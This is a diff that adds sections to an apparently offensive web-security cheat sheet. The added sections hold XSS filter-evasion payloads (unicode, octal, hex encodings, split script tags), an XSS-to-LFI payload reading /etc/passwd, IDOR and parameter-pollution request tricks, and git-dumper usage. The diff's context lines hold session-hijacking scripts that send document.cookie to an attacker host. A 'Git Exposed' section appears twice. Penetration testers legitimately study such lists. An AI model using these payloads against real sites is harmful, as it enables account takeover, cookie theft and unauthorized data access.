@@ -149,7 +149,142 @@ http://www.businessinfo.co.uk/labs/mxss/
 ### XSS Poliglote
 https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
+### Regex Blacklist Filtering
+-> Filter blocking on - Bypass  
+`(on\w+\s*=)`  
+```
+<svg onload%09=alert(1)> 
+<svg %09onload%20=alert(1)>
+<svg onload%09%20%28%2C%3B=alert(1)>
+<svg onload%0B=alert(1)>
+```  
+
+### Keyword Based in Filter
+#### Alert Blocked - Bypass
+```
+<script>\u0061lert(1)</script>
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<script>eval("\u0061lert(1)")</script>  
+<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
+```
+
+#### Removing script Tag - Bypass
+```
+<sCR<script>iPt>alert(1)</SCr</script>IPt>
+```
+
+### Scaping Quote
+#### Methods
+-> String.fromCharCode()  
+-> unescape  
+
+e.g.  
+-> decode URI + unescape method (need eval)  
+```
+decodeURI(/alert(%22xss%22)/.source)
+decodeURIComponent(/alert(%22xss%22)/.source)
+```  
+ 
+### Other bypass techniques
+-> unicode  
+```
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/>
+```
+
+Add execution sink:  
+-> eval  
+-> setInterval  
+-> setTimeout  
+
+-> octal  
+```
+<img src=x onerror="eval('\141lert(1)')"/>
+```
+-> hexadecimal  
+```
+<img src=x onerror="setInterval('\x61lert(1)')"/>
+```
+-> mix  (uni, hex, octa)  
+```
+<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
+```
+https://checkserp.com/encode/unicode/  
+http://www.unit-conversion.info/texttools/octal/  
+http://www.unit-conversion.info/texttools/hexadecimal/  
+
+### Other Examples
+#### HTML Tag
+```
+<div>here</div>
+```
+->  
+```
+<svg/onload=alert(1)
+```
+
+#### HTML Tag Attributes
+```
+<input value="here"/></input>
+```
+ 
+->  
+```
+" /><script>alert(1)</script>
+```
+  
+#### Script Tag
+```
+<script>
+    var name="here";
+</script>
+```
+  
+->  
+```
+";alert(1);//
+```
+
+#### Event Attributes
+```
+<button onclick="here;">Okay!</button>
+```
+
+->  
+```
+alert(1)
+```
+
+#### Dom Based
+```
+<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
+```
+  
+->  
+```
+javascript:alert(1)
+```
+
+### JavaScript Encoding
+-> jjencode  
+https://utf-8.jp/public/jjencode.html   
+-> aaencode  
+https://utf-8.jp/public/aaencode.html  
+-> jsfuck  
+http://www.jsfuck.com/  
+-> Xchars.js  
+https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html  
+
+### Decoder - Obfuscation (Javascript Decoder and PHP)
+https://malwaredecoder.com/  
+
+### XSS to LFI
+```
+<img src=x onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
+```
+	
 ### XSS - Session Hijacking
+-> Examples
 ```
 <script>new Image().src="http://<IP>/ok.jpg?output="+document.cookie;</script>
 <script type="text/javascript">document.location="http://<IP>/?cookie="+document.cookie;</script>  
@@ -157,6 +292,73 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 <script>document.location="http://<IP>/?cookie="+document.cookie;</script>  
 <script>fetch('http://<IP>/?cookie=' + btoa(document.cookie));</script>  
 ```
+
+### Template - Nuclei
+https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml
+
+## Git Exposed
+```
+git-dumper http://site.com/.git .
+```
+https://github.com/arthaud/git-dumper
+
+### Tools
+https://github.com/internetwache/GitTools
+
+## Broken Access Control - IDOR (Insecure Direct Object References)
+1. Search listing of Id's in requests and in case you don't find create at least two accounts and analysis requests involving ID's  
+2. Identify access controls in the application  
+3. Change the request method (GET, POST, PUT, DELETE, PATCH…)  
+4. search old versions of API's /api/v1/ /api/v2/ /api/v3/  
+5. Try sending a (*) instead of the ID, especially at search points  
+6. Brute-force IDs depending on context and predictability 
+	
+### IDOR + Parameter Pollution
+#### HTTP Parameter Pollution
+```
+GET /api/v1/messages?id=<Another_User_ID> # unauthourized
+GET /api/v1/messages?id=<You_User_ID>&id=<Another_User_ID> # authorized
+GET /api/v1/messages?id[]=<Your_User_ID>&id[]=<Another_User_ID>
+```
+	
+#### Json Parameter Pollution
+```
+POST /api/v1/messages
+{"user_id":<You_user_id>,"user_id":<Anoher_User_id>} 
+```
+-> with a JSON Object
+```
+POST /api/v1/messages
+{"user_id":{"user_id":<Anoher_User_id>}} 
+```
+-> with array  
+```
+{"user_id":001} #Unauthorized
+{"user_id":[001]} #Authorized
+```
+#### Random Case
+GET /admin/profile #Unauthorized
+GET /ADMIN/profile #Authorized
+
+### UUIDv1
+https://caon.io/docs/exploitation/other/uuid/
+https://github.com/felipecaon/uuidv1gen
+
+#### Others
+-> add .json if in ruby
+```
+/user/1029 # Unauthorized
+/user/1029.json # Authorized
+```
+
+## Git Exposed
+```
+git-dumper http://site.com/.git .
+```
+https://github.com/arthaud/git-dumper
+
+### Tools
+https://github.com/internetwache/GitTools
 
 ## Local File Inclusion - LFI
 ### Replace ../ - Bypass
